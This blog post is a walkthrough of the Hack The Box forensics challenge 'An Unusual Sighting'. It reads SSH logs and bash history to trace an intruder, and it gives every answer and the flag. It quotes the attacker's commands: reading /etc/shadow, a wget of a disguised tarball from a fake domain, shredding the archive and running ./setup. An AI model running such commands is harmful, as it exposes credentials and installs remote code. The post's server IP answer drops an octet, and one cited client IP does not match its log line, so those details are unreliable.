---
layout: post
title: "HTB Challenge: An Unusual Sighting"
date: 2025-07-08
categories: [writeup, forensic]
tags: [writeup,forensic]
image: https://miro.medium.com/v2/resize:fit:750/format:webp/1*Y_R2EBoqIJsips2jZmZDBQ.png
---

# 🧠 ***Forensic Log analysis***

## Scenario

CHALLENGE NAME: An unusual sighting

As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!

## Challenge Information

**Hack The Box Forensic challenge**   
**Category: Forensics**    
**Platform: Hack The Box**      
**Challenge Type: Log Analysis**    
**Difficulty: Easy-Medium**      
**Flag: HTB{4n_unusual_s1ght1ng_1n_SSH_l0gs!}**    


This is a forensic challenge involving investigation of two log files:

bash_history.txt
This file shows shell commands executed by users.

sshd.log
This contains logs of all SSH connection attempts and sessions.

The actual Docker machine (accessed via Netcat) simply asks a series of forensics questions, while the analysis is done locally.

<figure style="text-align:center;">
  <img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*8_5OsG2jI_Skowu-dzdJFw.png" alt="Process List" style="width:100%;">
  <figcaption style="text-align:center;"><em>the machine</em></figcaption>
</figure>

## What is the IP Address and Port of the SSH Server

```
[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain ""

```

From the ssh log this line shows that

- Connection from 100.87.190.253 port 63371  
→ This is the client’s IP and ephemeral port (the person initiating the connection).


- on 100.107.36.130 port 2221  
→ This is the server’s IP and port (where the SSH server is running and accepting connections).
Therefore the ssh server the attacker is connected to is 100.107.36 on port 2221.

Answer: `100.107.36:2221`

## What time is the first successful Login?

From the ssh log look for the earliest line that shows accepted password since this shows a succesful login.

```
[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2
```

So from this line at `2024–02–13 11:29:50` a successful root user logged in from IP `100.81.51.199`.

Answer: `2024–02–13 11:29:50`

## What is the time of the unusual Login?

So to know the unusual login time i looked for suspicious activity done by the user at the bash history.

From the bash_history log i found this suspicious activity.

```
[2024-02-19 04:00:18] whoami
[2024-02-19 04:00:20] uname -a
[2024-02-19 04:00:40] cat /etc/passwd
[2024-02-19 04:01:01] cat /etc/shadow
[2024-02-19 04:01:15] ps faux
[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
[2024-02-19 04:10:02] tar xvf latest.tar.gz
[2024-02-19 04:12:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup

```

🔍 These linux comand I considered suspicious due to :

- [2024–02–19 04:00:18] whoami   
The attacker checks what user they are. A common first step after gaining unauthorized access.
- [2024–02–19 04:00:20] uname -a  
The attacker gathers system information. Again, common post-compromise recon behavior.
- [2024–02–19 04:00:40] cat /etc/passwd  
Dumping the list of system users.
- [2024–02–19 04:01:01] cat /etc/shadow  
Accessing the shadow file (which stores password hashes) is extremely suspicious and indicates root-level access.
- [2024–02–19 04:01:15] ps faux  
Listing all running processes — attackers often do this to understand system state or find things to exploit.
- [2024–02–19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz  
Downloading a suspicious tarball from a non-official domain (gnu-packages.com is not a legit GNU site). Likely malware or a backdoor.
- [2024–02–19 04:10:02] tar xvf latest.tar.gz  
Extracts the malicious archive.
- [2024–02–19 04:12:02] shred -zu latest.tar.gz  
Securely deletes the archive using shred — this is highly suspicious as normal users don't usually do this unless they're hiding something.
- [2024–02–19 04:14:02] ./setup  
Runs the extracted binary/script — potentially a backdoor or rootkit installer

So since the first suspicious command starts at `[2024–02–19 04:00:18]` whoami I cross reference the time at ssh log to view login around this time and I found this is the nearest login:

```
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
```

Answer: `2024-02-19 04:00:14`

## What is the Fingerprint of the attacker’s public key?

```
[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain ""
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
```

From the SSH log, we can see that the attacker from IP `2.67.182.119` initially attempted to authenticate with an ECDSA public key. Although the key was rejected, the system logged its fingerprint as `SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4`, which identifies the attacker's public key.

Answer: `OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4`

## What is the first command the attacker executed after logging in?

Since the attacker successfully logged in at 2024-02-19 04:00:14, the first command they executed appears just seconds later at 2024-02-19 04:00:18. This command was whoami, which is commonly used to confirm the current user identity after gaining access. This timing and behavior strongly indicate it was the first action taken by the attacker post-login.

**sshd.log**
```
[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain ""
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
```

**bash_history.txt**
```
[2024-02-16 14:40:47] python ./server.py --tests
[2024-02-19 04:00:18] whoami
[2024-02-19 04:00:20] uname -a
```

Answer: `whoami`

## What is the final command the attacker executed before logging out?

To determine the final command executed by the attacker before logging out, I first checked the SSH logs to find the logout timestamp — 2024-02-19 04:38:17. Then, I cross-referenced this time with the Bash history and identified the last command run shortly before the logout. The command was ./setup, executed at 2024-02-19 04:14:02, which is the final recorded activity from the attacker before the session ended.

**sshd.log**
```
[2024-02-19 04:38:17] syslogin_perform_logout: logout() returned an error
```

**bash_history.txt**
```
[2024-02-19 04:14:02] ./setup
[2024-02-20 11:11:14] nvim server.py
```

Answer: `./setup`

Boom! Cracked every question, traced the intruder, and snatched the flag: HTB{4n_unusual_s1ght1ng_1n_SSH_l0gs!} 🔍💥

This challenge was a great hands-on experience reading logs and understanding system activity really helped sharpen my investigative skills and felt rewarding to solve learned a lot, and had a blast doing it!